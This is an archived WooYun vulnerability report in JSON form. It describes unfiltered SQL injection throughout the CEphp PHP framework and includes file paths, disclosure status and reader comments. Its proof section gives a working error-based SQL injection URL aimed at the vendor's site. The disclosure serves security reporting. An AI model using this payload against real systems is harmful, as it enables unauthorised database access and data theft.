{"id": 15050, "wybug_id": "wooyun-2012-015286", "wybug_title": "某轻量级php框架全站注入", "wybug_corp": "CEphp", "wybug_author": "Rona", "wybug_date": "2012-12-05 17:19", "wybug_open_date": "2013-01-19 17:19", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "缺乏过滤", "字符类型注射", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-01-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 没有过滤导致注入存在 详细说明：  http://www.cephp.com/   百度搜索轻量级php框架 ，第一个就是这CEPHP，手贱测试下居然存在注入，下载源码居然发现全站涉及数据库操作的全部存在注入，对变量完全没有任何过滤。无语。截图看下： \t1、主要文件demo\\M\\User\\student.php \n\n \t  处理是参数没过滤带入Mdb->find函数进行处理，可以看到Mdb，继承自M_User_Student  最终会定位到Cemvc\\Db\\MysqlDb.php文件，该函数如下： \n\n数据库查询语句也没有任何处理。。。注入产生   漏洞证明：  \nhttp://www.cephp.com/search/1'%20AND%20(SELECT%207552%20FROM(SELECT%20COUNT(*),CONCAT(0x3a666f613a,(SELECT%20(CASE%20WHEN%20(7552=7552)%20THEN%201%20ELSE%200%20END)),0x3a71777a3a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'PUWw'='PUWw\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 Rona@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-12-19 10:42 |    \t\tby_奇奇 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:7        | 2)\t\t \n  鲁过顶一下    \n     2013-01-21 09:33 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  框架都这么不安全 不应该呀    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}